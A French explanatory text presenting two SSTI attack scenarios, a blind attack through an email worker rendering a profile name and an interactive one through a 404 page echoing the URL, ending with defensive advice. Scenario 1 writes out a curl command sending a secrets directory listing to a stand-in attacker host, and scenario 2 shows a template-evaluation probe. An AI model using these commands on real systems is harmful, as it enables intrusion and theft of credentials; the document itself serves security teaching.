Scénarios d'Exploitation d'une Vulnérabilité SSTI


Scénario 1 : L'E-mail Marketing Personnalisé (Attaque en Aveugle)


Contexte

Une plateforme d'e-commerce souhaite améliorer l'engagement de ses clients. Les développeurs mettent en place un système qui envoie automatiquement un e-mail de bienvenue personnalisé lors de l'inscription. L'e-mail doit commencer par "Bonjour, [Prénom] !". Le prénom est celui que l'utilisateur a renseigné dans son profil.

Point d'Injection

Le champ "Prénom" dans le formulaire de profil de l'utilisateur.

Déroulement de l'Attaque

1. Préparation : Un attaquant crée un compte sur la plateforme. Au lieu d'entrer un prénom normal comme « Blaise » , il saisit un payload SSTI dans le champ. Ce payload est conçu pour être exécuté sans renvoyer de résultat visible ; par exemple, une commande qui envoie des informations sensibles du serveur vers un site contrôlé par l'attaquant (curl http://attaquant.com --data "$(ls /app/secrets/)").

1. Déclenchement : L'attaquant sauvegarde son profil. Le site, pour confirmer la modification, envoie un e-mail de "mise à jour de profil" ou l'attaquant effectue une action déclenchant l'e-mail de bienvenue.
2. Exécution : En arrière-plan, un service (le "worker" d'e-mailing) récupère le prénom depuis la base de données. Il l'insère dans le template de l'e-mail : "Bonjour, {{ ''.__class__... }}". Le moteur de template exécute le payload.
3. Impact : La commande curl est exécutée sur le serveur d'e-mailing. L'attaquant reçoit la liste des fichiers de secrets (clés API, mots de passe de base de données, etc.) sur son propre serveur. Il n'a jamais eu de retour direct sur le site web, c'est pourquoi on parle d'attaque "en aveugle" (blind). La compromission est silencieuse 


Scénario 2 : La Page d'Erreur 404 "Intelligente" (Attaque Interactive)


Contexte

Une application web moderne veut améliorer l'expérience utilisateur, y compris pour les pages d'erreur. Lorsqu'un utilisateur accède à une URL qui n'existe pas, une page 404 personnalisée s'affiche avec le message : "Désolé, la page [chemin/demandé] est introuvable."

Point d'Injection

Le chemin de l'URL, qui est directement contrôlé par l'utilisateur dans la barre d'adresse de son navigateur.

Déroulement de l'Attaque

1. Détection : L'attaquant suspecte une faille et teste une URL simple : http://exemple.com/{{ 6*7 }}.
2. Déclenchement : Le serveur web ne trouve aucune ressource correspondant à ce chemin et déclenche son gestionnaire d'erreur 404. Ce dernier récupère le chemin demandé (/{{ 6*7 }}) pour l'afficher dans la page d'erreur.
3. Exécution : Le moteur de template, en générant la page 404, traite la chaîne "Désolé, la page /{{ 6*7 }} est introuvable.". Il voit l'instruction {{ 6*7 }}, l'exécute et la remplace par 42.
4. Impact : L'attaquant voit s'afficher à l'écran : "Désolé, la page /42 est introuvable.". Il a un retour interactif et immédiat qui confirme la vulnérabilité. Fort de cette confirmation, il peut construire son payload final étape par étape pour lire des fichiers de configuration (/app/settings.py) ou obtenir un accès direct au serveur (reverse shell), le tout via l'URL.


Conclusion

Ces deux scénarios montrent que la surface d'attaque pour une SSTI est très large. Elle ne se limite pas aux champs de saisie évidents, mais inclut les paramètres d'URL, les champs de profil, et même des fonctionnalités en arrière-plan comme l'envoi d'e-mails. La seule défense efficace est de considérer toute donnée modifiable par l'utilisateur comme potentiellement dangereuse et de la traiter en conséquence.